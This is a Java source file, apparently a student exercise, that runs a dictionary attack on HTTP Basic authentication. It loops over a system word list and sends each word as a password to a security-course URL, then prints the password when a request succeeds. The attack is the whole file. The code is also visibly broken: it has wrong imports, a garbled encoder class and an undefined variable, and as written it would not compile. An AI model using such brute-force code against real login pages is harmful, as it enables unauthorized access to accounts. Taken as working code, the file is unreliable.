
import java.net.*;
import java.io.*;
import java.misc.*;

public class Dictionary
{
   public static void main (String args[])
   {
      
      String file = "/usr/share/lib/dict/words";
      FileReader fRead;
      BufferedReader buf;

      try
      {
         fRead = new FileReader(file);
         buf = new BufferedReader(fRead);
         String Password = "";
         int i=0;

         
         while( (Password = buf.readLine()) != null)
         {
            i++;
            String a = myurl("http://sec-crack.cs.rmit.edu./SEC/2", "", Password, i);
         }
      }
      catch(FileNotFoundException e)
      {
         System.out.println("File not found");
      }
      catch(IOException ioe)
      {
         System.out.println("IO Error " + ioe);
      }
   }

   public static String encode (String source)
   {
      BASE64Encoder enc = new source.misc.BASE64Encoder();
      return(enc.encode(source.getBytes()));
   }

   public static String myurl (String url, String Name, String Password, int val )
   {
      String thisLine;
      String retVal;
      URL u;
      URLConnection uc;
      retVal = "";

      try
      {
         u = new URL(url);
         try
         {
            uc = u.openConnection();
            if (Name != null)
            {
               uc.setRequestProperty("Authorization", " " + encode(Name + ":" + Password));
            }
            InputStream content = (InputStream)uc.getInputStream();
            BufferedReader in = new BufferedReader (new InputStreamReader(content));

            String line;
            
            while ((line = in.readLine()) != null)
            {
               retVal += line;
               System.out.println(line);
               System.out.println("password="+Password+";number:"+num);
               System.exit(0);
            }
         }
         catch (Exception e)
         {
            ;
            
         }
      }
      catch (MalformedURLException e)
      {
         return(url + " is not a parseable URL");
      }
      return retVal;
   }
}


